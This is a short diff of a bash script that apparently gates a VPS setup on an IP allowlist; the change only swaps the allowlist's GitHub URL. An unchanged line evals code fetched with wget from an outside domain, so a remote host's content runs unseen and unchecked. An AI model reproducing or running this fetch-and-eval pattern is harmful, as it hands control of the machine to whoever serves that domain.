@@ -1,6 +1,6 @@
 #!/bin/bash
 MYIP=$(cat /usr/bin/.ipvps)
-    ALLOWED_IP=$(curl -sS "https://raw.githubusercontent.com/diah082/izin/main/ip" | grep "$MYIP" | awk '{print $4}')
+    ALLOWED_IP=$(curl -sS "https://raw.githubusercontent.com/xccvme/vps-ip-allowlist/main/whitelist" | grep "$MYIP" | awk '{print $4}')
     if [[ "$MYIP" == "$ALLOWED_IP" ]]; then
 	eval $(wget -qO- "domainsaya.dekaa.my.id")
     else
